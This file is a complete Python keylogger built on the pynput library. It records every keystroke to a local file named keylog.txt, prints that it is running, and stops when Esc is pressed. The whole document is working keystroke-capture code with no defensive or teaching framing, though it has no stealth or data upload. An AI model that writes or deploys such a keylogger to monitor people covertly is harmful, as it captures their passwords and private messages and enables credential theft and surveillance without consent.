from pynput.keyboard import Key, Listener

# Path to the log file
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Write pressed key to the log file
        with open(LOG_FILE, "a") as f:
            f.write(f"{key} ")
    except Exception as e:
        print(f"Error: {str(e)}")

def on_release(key):
    if key == Key.esc:
        # Stop the keylogger by returning False
        return False

def main():
    print("Keylogger is running. Press 'Esc' to stop.")

    # Start listening for key presses
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
